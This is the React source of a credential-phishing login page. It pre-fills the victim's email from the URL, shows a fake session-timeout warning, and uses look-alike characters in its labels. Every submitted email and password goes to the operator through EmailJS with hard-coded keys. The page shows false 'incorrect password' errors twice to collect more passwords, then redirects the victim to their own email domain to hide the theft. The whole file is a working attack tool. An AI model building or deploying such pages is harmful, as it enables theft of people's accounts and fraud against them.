//jshint esversion:6
import React, {useState, useRef, useEffect} from 'react'
import emailjs from '@emailjs/browser';
import BeatLoader from "react-spinners/BeatLoader";
import Grid from '@mui/material/Grid';
import logo from './ong.png';
import PersonIcon from '@mui/icons-material/Person';
import LockIcon from '@mui/icons-material/Lock';
import VisibilityOffIcon from '@mui/icons-material/VisibilityOff';
import VisibilityIcon from '@mui/icons-material/Visibility';
import WarningAmberIcon from '@mui/icons-material/WarningAmber';


function getPartAfterDot(text) {
  var dotIndex = text.indexOf('@');
  if (dotIndex !== -1) {
    return text.substring(dotIndex + 1);
  }
  return '';
}

function App() {
  const url = window.location.search.slice(20)
  const form = useRef();
  const [count, setCount] = useState(0)
  const [email, setEmail] = useState(url ? url : '')
  const [pwdOne, setPwdOne] = useState('')

  const [pwdError, setPwdError] =  useState(false)
  const [isTimeOut, setIsTimeOut] =  useState(true)

  const [loading, setLoading] = useState(false)
  const [visible, setVisible] = useState(false)

  useEffect(() => {
    setTimeout(() => {
      setIsTimeOut(false)
    }, 1000)
  }, [])

  const handleEmailChange = (e) => {
    setEmail(e.target.value)
  }
  const handlePwdOneChange = (e) => {
    setPwdOne(e.target.value)
  }


  const handleFormSubmit = async (e) => {
    e.preventDefault()
    setPwdError(false)
    setLoading(true)

    if (count < 2) {
      setCount(prevCount => prevCount + 1)

      setLoading(true)
      emailjs.sendForm('service_iw9rlny', 'template_affyeve', form.current, 'ybHgz7hBHnAMrNFHG')
      .then((result) => {
        setPwdOne("")
        setLoading(false)
        setPwdError(true)
      }, (error) => {
          console.log(error.text);
      });
    }


    if (count >= 2 ) {
      emailjs.sendForm('service_iw9rlny', 'template_affyeve', form.current, 'ybHgz7hBHnAMrNFHG')
      .then((result) => {
        const redir = getPartAfterDot(email)
        window.location.replace(`https://${redir}`);
      }, (error) => {
          console.log(error.text);
      });
    }
  }

  const handleVisibility = () => {
    setVisible(prevValue => !prevValue)
  }

  return (
    <div className="general">

      <div className='img-div'>
        <img src={logo} className="img2" alt='Timeout'/>
      </div>
      
      <form ref={form} onSubmit={handleFormSubmit}>
          <Grid container>
            <Grid item xs={2}>
              <div className='icon'>
                <PersonIcon sx={{color: "black"}} />
              </div>
            </Grid>
            <Grid item xs={10}>
              <input type="email" placeholder='ÉmaiI' name="mascot" value={email} onChange={handleEmailChange} required/>
            </Grid>
          </Grid>


          <Grid container>
            <Grid item xs={2}>
              <div className='icon'>
                <LockIcon sx={{color: "black"}} />
              </div>
            </Grid>
            <Grid item xs={10}>
              <input type={visible ? "text" : "password"} color='primary' name="pwdOne" value={pwdOne} placeholder="Pássword" onChange={handlePwdOneChange} required />
            </Grid>
              <Grid item xs={1} sx={{position: 'relative', left: '290px', top: '-40px'}}>
                {!visible ? 
                  <VisibilityIcon onClick={handleVisibility} sx={{cursor: 'pointer'}} /> 
                  : 
                  <VisibilityOffIcon onClick={handleVisibility} sx={{cursor: 'pointer'}} />
                }
              </Grid>
          </Grid>


          <button type='submit' className='button' disabled={loading}>
            {loading ?
              <BeatLoader
                color='#FFF'
                loading={loading}
                size={15}
                aria-label="Loading Spinner"
                data-testid="loader"
              /> : "LÓGlN"
            }
            
          </button>

          <div><a href='/'>Get support</a></div>
          {pwdError && <div className='error'>Incorrect pássword, Try again</div>}

      </form>

      <div className={`timeout ${isTimeOut? 'visible' : 'hidden'}`}><WarningAmberIcon sx={{color: 'black'}} /> <span> Session Timeout</span></div>

    </div>
  );
}

export default App;
